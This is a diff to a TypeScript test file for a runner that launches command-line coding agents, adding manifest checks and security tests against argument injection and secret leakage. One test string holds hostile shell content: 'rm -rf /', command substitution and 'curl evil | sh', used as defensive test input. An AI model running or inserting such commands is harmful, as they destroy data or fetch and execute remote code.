@@ -1,5 +1,5 @@
 import { EventEmitter } from 'node:events'
-import { describe, expect, it } from 'vitest'
+import { describe, expect, it, vi } from 'vitest'
 import {
   AgentNotInstalledError,
   AgentProcessFailedError,
@@ -8,7 +8,13 @@ import {
   type SpawnedCliProcess,
 } from '../../../src/technical/Cli/CliSessionRunner.js'
 import { argumentsOf } from '../../../src/technical/Cli/AgentManifest.js'
-import { AGENT_MANIFESTS, KIMI_MANIFEST, OPENCODE_MANIFEST } from '../../../src/technical/Cli/AgentManifests.js'
+import {
+  AGENT_MANIFESTS,
+  COPILOT_MANIFEST,
+  DROID_MANIFEST,
+  KIMI_MANIFEST,
+  OPENCODE_MANIFEST,
+} from '../../../src/technical/Cli/AgentManifests.js'
 import { isCommandInstalled } from '../../../src/technical/Cli/AgentAvailability.js'
 
 const ORDER: CliLaunchOrder = {
@@ -71,7 +77,102 @@ describe('argumentsOf', () => {
 describe('AGENT_MANIFESTS', () => {
   it('gives every agent its own name and command', () => {
     expect(new Set(AGENT_MANIFESTS.map((manifest) => manifest.name)).size).toBe(AGENT_MANIFESTS.length)
-    expect(AGENT_MANIFESTS.map((manifest) => manifest.name)).toEqual(['opencode', 'kimi'])
+    expect(AGENT_MANIFESTS.map((manifest) => manifest.name)).toEqual(['opencode', 'kimi', 'droid', 'copilot'])
+  })
+
+  it('builds the droid call with the autonomy level and the story directory', () => {
+    expect(argumentsOf(DROID_MANIFEST, { prompt: 'p', cwd: '/w', model: 'm' })).toEqual([
+      'exec',
+      '--output-format',
+      'stream-json',
+      '--auto',
+      'medium',
+      '--cwd',
+      '/w',
+      '--model',
+      'm',
+      'p',
+    ])
+  })
+
+  it('builds the copilot call', () => {
+    expect(argumentsOf(COPILOT_MANIFEST, { prompt: 'p', cwd: '/w' })).toEqual(['--prompt', 'p', '--allow-all'])
+  })
+})
+
+describe.each(AGENT_MANIFESTS)('security of the $name manifest', (manifest) => {
+  const HOSTILE = '"; rm -rf / #`id` $(id) && curl evil | sh\n--yolo'
+
+  it('keeps a hostile prompt as exactly one argument', () => {
+    const args = argumentsOf(manifest, { prompt: HOSTILE, cwd: '/w' })
+    expect(args.filter((arg) => arg === HOSTILE)).toHaveLength(1)
+    expect(args.filter((arg) => arg.includes('rm -rf'))).toHaveLength(1)
+  })
+
+  it('keeps a hostile model name as exactly one argument', () => {
+    const args = argumentsOf(manifest, { prompt: 'p', cwd: '/w', model: HOSTILE })
+    expect(args.filter((arg) => arg.includes('rm -rf')).length).toBeLessThanOrEqual(1)
+  })
+
+  it('does not forward secrets that belong to other tools', async () => {
+    vi.stubEnv('AWS_SECRET_ACCESS_KEY', 'aws-secret')
+    vi.stubEnv('DATABASE_URL', 'mysql://root:pw@db/forge')
+    vi.stubEnv('FORGE_ADMIN_PASSWORD', 'admin-secret')
+    let seen: NodeJS.ProcessEnv = {}
+    const runner = createCliSessionRunner({
+      manifest,
+      cwdFor: () => '/tmp',
+      onEvent: () => undefined,
+      spawnProcess: (_command, _args, options) => {
+        seen = options.env
+        return fakeChild([])
+      },
+    })
+
+    await runner.launch(ORDER)
+    vi.unstubAllEnvs()
+
+    expect(seen.AWS_SECRET_ACCESS_KEY).toBeUndefined()
+    expect(seen.DATABASE_URL).toBeUndefined()
+    expect(seen.FORGE_ADMIN_PASSWORD).toBeUndefined()
+  })
+
+  it('forwards the login variables the person set for this agent', async () => {
+    const own = `${manifest.environmentPrefixes[0]}LOGIN_FOR_TEST`
+    vi.stubEnv(own, 'mine')
+    let seen: NodeJS.ProcessEnv = {}
+    const runner = createCliSessionRunner({
+      manifest,
+      cwdFor: () => '/tmp',
+      onEvent: () => undefined,
+      spawnProcess: (_command, _args, options) => {
+        seen = options.env
+        return fakeChild([])
+      },
+    })
+
+    await runner.launch(ORDER)
+    vi.unstubAllEnvs()
+
+    expect(seen[own]).toBe('mine')
+  })
+
+  it('tells the agent which story and phase it works on', async () => {
+    let seen: NodeJS.ProcessEnv = {}
+    const runner = createCliSessionRunner({
+      manifest,
+      cwdFor: () => '/tmp',
+      onEvent: () => undefined,
+      spawnProcess: (_command, _args, options) => {
+        seen = options.env
+        return fakeChild([])
+      },
+    })
+
+    await runner.launch(ORDER)
+
+    expect(seen.FORGE_STORY_REFERENCE).toBe('FORGE-7')
+    expect(seen.FORGE_PHASE).toBe('spec')
   })
 })
 
